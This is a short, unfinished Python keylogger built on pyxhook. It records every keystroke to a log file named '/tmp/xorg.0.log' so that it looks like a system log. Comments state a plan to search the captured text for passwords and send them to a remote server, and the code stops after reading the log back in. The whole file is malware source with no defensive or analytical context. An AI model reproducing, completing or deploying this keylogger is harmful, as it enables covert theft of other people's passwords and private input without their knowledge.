import pyxhook
# Global variables




#Path to save file
log_file='/tmp/xorg.0.log'
#passWordFile='/tmp/xorg.1.log'


#this function is called everytime a key is pressed.
def OnKeyPress(event):

  fileOpen=open(log_file,'a')

  fileOpen.write(event.Key)
  # for every 20 Characters written, write a new line
  #fileOpen.write(( ' '.join(textwrap.wrap(event.Key, 20))))

  if event.Ascii==32 or event.Ascii==46 or event.Ascii==13:

      # instead of writting out an actual space,
      # use this to find the word "space" and remove it from the file
      # if a user types space, then the word will be known as an error
      fileOpen.write('\n')

  if event.Ascii==96:

	# if the (`) grave key is pressed. exit
	fileOpen.close()
	new_hook.cancel()




#Format Text After the keyloggin sessions ends
#search for password and pipe it
# This will be the base of sending the password remotely to a server

sFile = open("/tmp/xorg.0.log","r")
search = sFile.readlines()
